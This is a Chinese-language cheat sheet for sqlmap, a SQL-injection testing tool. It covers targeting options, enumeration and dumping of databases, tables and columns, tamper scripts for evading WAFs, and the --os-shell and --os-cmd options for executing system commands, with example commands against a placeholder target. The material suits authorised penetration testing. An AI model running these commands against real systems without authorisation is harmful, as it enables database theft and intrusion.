# sqlmap 完整指令参考

sqlmap 用于自动化检测与利用 SQL 注入。使用前建议先手动确认存在注入点，再谨慎构造命令。

## 基本用法

- 指定 URL：`-u "http://target/page?id=1"`
- 指定注入参数：`-p id` 只测 id；`--param-exclude=other` 排除某参数
- POST 请求：`--data "id=1&name=test"` 或 `-r request.txt`（request.txt 为完整 HTTP 请求）
- Cookie：`--cookie "session=xxx"`
- 请求方法：`--method=POST`
- 自定义 User-Agent：`--user-agent="Mozilla/5.0 ..."`

## 探测与枚举

- 数据库列表：`--dbs`
- 指定库下列表：`-D dbname --tables`
- 指定表下列/数据：`-D dbname -T tablename --columns` 或 `--dump` 导出整表
- 指定列导出：`-C col1,col2 --dump`
- 当前用户/当前库：`--current-user`、`--current-db`

## 级别与风险

- `--level 1-5`：检测深度，默认 1，越高测试越多
- `--risk 1-3`：风险等级，默认 1，越高 payload 越激进
- 建议先 level=1 risk=1，必要时再提高，避免误伤或触发 WAF

## 技术选择

- `--technique BUEQST`：B 布尔盲注、U UNION、E 报错、Q 内联、S 堆叠、T 时间盲注。可组合如 `--technique=U` 只测 UNION

## Tamper 与绕过

- `--tamper=space2comment`、`randomcase`、`between` 等，逗号分隔多个，用于 WAF/过滤绕过
- 常用：`space2comment,randomcase`、`charencode`、`equaltolike`

## 会话与批处理

- `--batch`：非交互，默认选是，适合自动化
- `--flush-session`：忽略已存 session，重新探测
- `--fresh-queries`：忽略缓存查询

## 高级

- `--os-shell` / `--os-cmd="id"`：尝试执行系统命令（仅授权测试且必要时使用）
- `--proxy=http://127.0.0.1:8080`：经代理发请求
- `--delay=1`：请求间隔秒数，限速
- `--timeout=10`：单次请求超时

## 示例命令

GET 注入（列名/数据）：
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" --batch -D dbname -T tablename --columns
sqlmap -u "http://target/page?id=1" --batch -D dbname -T tablename --dump
```

POST 注入：
```bash
sqlmap -u "http://target/login.php" --data "user=admin&pass=123" --batch -p pass --dbs
```

从 request 文件读取（含 Cookie/Header）：
```bash
sqlmap -r /path/to/request.txt --batch --dbs
```
request.txt 格式为完整 HTTP 请求（含第一行、Header、空行、Body）。
